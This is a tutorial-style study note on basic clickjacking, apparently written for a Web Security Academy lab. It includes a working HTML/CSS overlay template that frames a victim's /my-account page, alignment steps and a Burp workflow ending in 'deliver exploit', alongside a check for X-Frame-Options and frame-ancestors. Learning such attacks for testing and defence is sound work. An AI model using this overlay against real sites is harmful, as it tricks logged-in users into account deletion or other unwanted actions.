# Basic Clickjacking

## Overview

Basic clickjacking involves framing a target page and positioning a visible decoy element over a sensitive control.

The victim believes they are clicking the decoy, but the actual click is received by the transparent target iframe.

---

# Attack Structure

```text
Attacker-Controlled Page
        │
        ├── Visible Decoy
        │
        └── Transparent iframe
                 │
                 ▼
           Target Website
                 │
                 ▼
           Sensitive Action
```

---

# Basic Iframe

The target page can be embedded using:

```html
<iframe src="https://victim-website.com/my-account"></iframe>
```

The iframe is positioned relative to the attacker's page.

---

# Basic HTML Template

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.1;
        z-index: 2;
    }

    div {
        position: absolute;
        top: 400px;
        left: 80px;
        z-index: 1;
    }
</style>

<div>Test me</div>

<iframe src="https://victim-website.com/my-account"></iframe>
```

---

# CSS Components

## iframe

```css
iframe {
    position: relative;
    width: 700px;
    height: 500px;
    opacity: 0.1;
    z-index: 2;
}
```

The iframe:

- Is positioned relative to its normal location.
- Has a defined width and height.
- Uses opacity to make the target page transparent.
- Uses a higher `z-index` so that it receives the click.

---

## Decoy Element

```css
div {
    position: absolute;
    top: 400px;
    left: 80px;
    z-index: 1;
}
```

The visible element is positioned underneath the transparent iframe.

---

# Why z-index Matters

The target iframe needs to be above the visible decoy for the click to reach the framed page.

Conceptually:

```text
z-index: 2
    ↓
Transparent iframe
```

```text
z-index: 1
    ↓
Visible decoy
```

Therefore:

```text
Victim sees:
"Test me"

Browser receives:
Click on target iframe
```

---

# Opacity Testing

During alignment, use:

```css
opacity: 0.1;
```

This makes the target page partially visible.

It allows the tester to determine whether the decoy is positioned correctly.

After alignment, the opacity can be reduced.

The supplied material uses:

```css
opacity: 0.0001;
```

for the submitted attack.

---

# Alignment Process

## Step 1

Open the exploit page.

## Step 2

Keep the iframe partially visible:

```css
opacity: 0.1;
```

## Step 3

Identify the target button.

For example:

```text
Update email
```

## Step 4

Position the visible decoy over the target button.

Example:

```text
Visible:
Click me
```

Target underneath:

```text
Update email
```

---

# Verify Alignment

Hover over the decoy.

The cursor should indicate that the target control underneath is interactive.

If the cursor does not behave as expected:

```text
Adjust top
Adjust left
```

Example:

```css
top: 400px;
left: 80px;
```

---

# Final Overlay

Once the alignment is correct:

```text
Test me
```

can be changed to:

```text
Click me
```

Then reduce iframe opacity.

---

# Basic Attack Flow

```text
Create iframe
      ↓
Load target page
      ↓
Set iframe dimensions
      ↓
Set opacity
      ↓
Create decoy
      ↓
Position decoy
      ↓
Align target button
      ↓
Test interaction
      ↓
Reduce opacity
      ↓
Deliver exploit
```

---

# Example Target

The supplied material demonstrates a basic attack against:

```text
/my-account
```

The target contains an account action such as:

```text
Delete account
```

The iframe can be loaded with:

```html
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

The decoy is positioned over the target action.

---

# Important Testing Rule

When testing a destructive action such as:

```text
Delete account
```

do not click the actual target control during alignment.

Instead:

```text
Use partial opacity
        ↓
Verify position
        ↓
Adjust CSS
        ↓
Change decoy text
        ↓
Deliver to authorized victim
```

The supplied lab specifically warns that manually clicking the destructive target can break the lab and require a reset.

---

# Basic Clickjacking With Account Actions

```text
Victim logged in
       ↓
Attacker page opened
       ↓
/my-account loaded in iframe
       ↓
Iframe made transparent
       ↓
"Click me" placed over target button
       ↓
Victim clicks
       ↓
Target account action executes
```

---

# Conditions for Basic Clickjacking

A useful candidate generally requires:

```text
1. Target page can be framed
2. Victim is authenticated
3. Sensitive action exists
4. Action can be triggered through UI interaction
5. Target control can be aligned with attacker-controlled content
```

---

# Frameability Check

Before building the exploit, inspect the response headers.

Look for:

```http
X-Frame-Options
```

and:

```http
Content-Security-Policy
```

particularly:

```text
frame-ancestors
```

If framing is prohibited, basic clickjacking may not work.

---

# Basic Burp Workflow

```text
Proxy
  ↓
HTTP History
  ↓
Identify Target Page
  ↓
Check Response Headers
  ↓
Check Frameability
  ↓
Open Exploit Server
  ↓
Create iframe
  ↓
Add Decoy
  ↓
Align Elements
  ↓
Test With Opacity
  ↓
Reduce Opacity
  ↓
Deliver Exploit
```

---

# Key Takeaways

- Basic clickjacking uses a transparent iframe and a visible decoy.
- The iframe contains the target page.
- CSS controls the size and position of the iframe and decoy.
- `z-index` determines which element receives the click.
- Use partial opacity while aligning the target.
- Reduce opacity only after the alignment is correct.
- Sensitive actions such as account deletion require careful testing.
- Always check whether the target permits framing before constructing the attack.